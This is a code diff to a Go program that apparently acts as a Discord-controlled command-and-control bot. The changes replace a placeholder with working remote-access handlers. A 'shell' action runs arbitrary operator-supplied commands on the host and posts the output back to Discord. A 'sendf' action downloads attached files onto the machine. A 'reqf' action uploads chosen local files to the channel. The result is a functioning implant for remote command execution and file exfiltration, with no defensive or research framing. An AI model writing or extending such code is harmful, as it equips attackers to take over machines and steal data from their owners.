@@ -2,15 +2,16 @@ package main
 
 import (
 	"fmt"
-	"github.com/google/uuid"
 	"os"
 	"os/exec"
 	"os/signal"
+	"strings"
 	"syscall"
 	"time"
 
 	"github.com/brnlee/DiscordGo_CC/discord"
 	"github.com/bwmarrin/discordgo"
+	"github.com/google/uuid"
 )
 
 var botID string
@@ -76,15 +77,34 @@ func messageCreate(s *discordgo.Session, m *discordgo.MessageCreate) {
 	if err != nil || n != 3 {
 		return
 	}
-	if target == "all" || target == botID {
-		println("Received Command", action, arg)
-		cmd := exec.Command("echo", "Hello World")
-		stdout, err := cmd.Output()
-		if err != nil {
-			println(err)
+	if target != "all" && target != botID {
+		return
+	}
+	println("Received Command", action, arg)
+	switch action {
+	case "shell":
+		argTokens := strings.Split(arg, " ")
+		if len(argTokens) == 0 {
 			return
 		}
-		response := fmt.Sprintf("%s\n%q\n%q", botID, action+" "+arg, string(stdout))
+		cmd := exec.Command(argTokens[0])
+		if len(argTokens) > 1 {
+			cmd = exec.Command(argTokens[0], argTokens[1:]...)
+		}
+		stdout, err := cmd.Output()
+		var response string
+		if err != nil {
+			response = fmt.Sprintf("%s\n%q\n%q", botID, action+" "+arg, err.Error()+"\n")
+		} else {
+			response = fmt.Sprintf("%s\n%q\n%q", botID, action+" "+arg, string(stdout))
+		}
 		discord.SendMessage(s, response)
+	case "sendf":
+		file := m.Attachments[0]
+		discord.DownloadFile(file.Filename, file.URL)
+	case "reqf":
+		content := fmt.Sprintf("%s\n%q\n%q", botID, action+" "+arg, "")
+		discord.SendComplexMessage(s, content, arg)
 	}
+
 }
